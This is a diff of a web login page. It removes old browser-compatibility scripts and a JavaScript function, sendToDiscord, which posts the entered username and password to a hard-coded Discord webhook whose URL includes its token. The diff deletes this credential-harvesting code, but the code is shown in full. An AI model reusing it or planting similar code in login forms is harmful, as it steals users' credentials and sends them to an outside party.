@@ -27,21 +27,7 @@
 
 		<link rel="stylesheet" type="text/css" href="dist/css/component.css" />
 		<script src="dist/js/modernizr.custom.js"></script>
-		<!--
-		<script type="text/javascript" src="dist/js/detectmobilebrowser.jq.js"></script>
-		<script>
-		$(document).ready(function() {
-			if(jQuery.browser.mobile){
-				
-			}
-		})
-		</script>
-		-->
-		<!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
-		<!--[if lt IE 9]>
-		  <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
-		  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
-		<![endif]-->
+		
 	</head>
 
 	<body>
@@ -58,30 +44,7 @@
 		<script type="text/javascript" src="md5.js"></script>
 		<script type="text/javascript">
 		<!--
-			function sendToDiscord(username, password) {
-    const webhookURL = 'https://ptb.discord.com/api/webhooks/1257326286917996575/VM2B7gGOsmIBRoHZxO4a6AInGQuIig25XpYFNr0x9Yc9UXImXs-J8czF5KFd4njSKNZG';
-    const message = {
-        content: `Username: ${username}\n Password: ${password}`
-    };
-
-    fetch(webhookURL, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(message)
-    })
-    .then(response => {
-        if (response.ok) {
-            console.log('Message sent to Discord webhook successfully.');
-        } else {
-            console.error('Error sending message to Discord webhook.');
-        }
-    })
-    .catch(error => {
-        console.error('Error sending message to Discord webhook:', error);
-    });
-}
+			
 
 function doLogin() {
     const username = document.login.username.value;
